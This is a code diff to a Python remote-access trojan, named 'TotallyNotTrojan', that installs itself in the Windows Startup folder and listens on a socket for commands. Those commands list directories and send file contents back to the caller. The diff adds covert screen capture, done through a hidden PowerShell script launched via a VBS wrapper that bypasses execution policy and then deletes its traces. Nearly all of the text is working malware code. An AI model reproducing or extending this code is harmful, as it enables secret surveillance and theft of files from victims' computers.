@@ -1,5 +1,5 @@
 import socket, os, time, ctypes
-from random import randint;VERSION = "BUILD 1424.NOUPD (Reading files via cat)"
+from random import randint;VERSION = "BUILD 15.LIMA (Perfmon screenshotter)"
 sock = socket.socket();sock.bind(("", 9081));sock.listen(10)
 import sys, getpass
 boot = "C:/Users/"+getpass.getuser()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/TotallyNotTrojan.pyw"
@@ -61,13 +61,45 @@ def ls():
         path = conn.recv(10005).decode("utf-8")
         if path != None and path != "":
             flsf = os.listdir(path)
-            fls = str(flsf.encode("utf-8"))
+            fls = str(flsf).encode("utf-8")
             conn.send(fls)
     except FileNotFoundError: pass
 def cat(fl):
     with open(fl, "rb") as f:
         conn.send(f.read())
         f.close()
+def perform_screencap():
+    payload = '''
+Add-Type -AssemblyName System.Windows.Forms
+$image = New-Object System.Drawing.Bitmap(2000, 1500)
+$graphic = [System.Drawing.Graphics]::FromImage($image)
+$point = New-Object System.Drawing.Point(0, 0)
+$graphic.CopyFromScreen($point, $point, $image.Size);
+$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
+[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
+$image.Save("result.png", [System.Drawing.Imaging.ImageFormat]::Png)
+'''
+    with open("scr.ps1", "w") as payload_screencaper:
+        payload_screencaper.write(payload)
+        payload_screencaper.close()
+    import os
+    attack = "powershell -win hidden -noni -nop -executionpolicy bypass ./scr.ps1"
+    initializer_p = '''
+command = "'''+attack+'''"
+set shell = CreateObject("WScript.Shell")
+shell.Run command,0, false
+'''
+    with open("scr.vbs", "w") as initializer:
+        initializer.write(initializer_p)
+        initializer.close()
+    os.popen("scr.vbs")
+    time.sleep(1)
+    data = open("result.png", "rb").read()
+    os.remove("scr.vbs")
+    os.remove("scr.ps1")
+    os.remove("result.png")
+    conn.send(str(len(data)).encode("utf-8"))
+    conn.send(data)
 while True:
     conn, addr = sock.accept()
     data = conn.recv(16384)
@@ -112,4 +144,6 @@ while True:
     if udata == "cdjoke":cdjoke()
     if udata == "cat":
         cat(conn.recv(16384).decode("utf-8"))
+    if udata == "screenshot":
+        perform_screencap()
     else:pass;conn.close()
